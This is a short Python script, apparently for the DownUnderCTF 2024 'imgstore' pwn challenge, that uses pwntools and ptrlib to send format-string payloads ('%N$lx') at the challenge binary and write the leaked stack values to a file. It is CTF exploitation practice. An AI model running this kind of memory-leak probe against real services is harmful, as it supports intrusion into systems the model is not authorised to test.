#!/usr/bin/env python
import ptrlib as ptr
import pwn
import sys

exe = ptr.ELF("./imgstore_patched")
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")
pwn.context.binary = pwn.ELF(exe.filepath, checksec=False)


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        addr = "2024.ductf.dev:30022"
        addr = addr.split(":")
        host = addr[0]
        port = int(addr[1])
        return ptr.Socket(host, port)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    dump = []

    io.sendlineafter(">> ", "3")
    for i in range(100):
        io.sendlineafter("Enter book title: ", f"AAAA#%{i + 1}$lx#")
        io.recvuntil("#")
        data = int(io.recvuntil("#").strip(b"#"), 16)
        dump.append(f"{i+1}: {hex(data)}")
        io.sendlineafter("Still interested in selling your book? [y/n]: ", "y")
        continue

    with open("./dump.txt", "w") as f:
        f.write("\n".join(dump))

    io.close()
    return


if __name__ == "__main__":
    main()
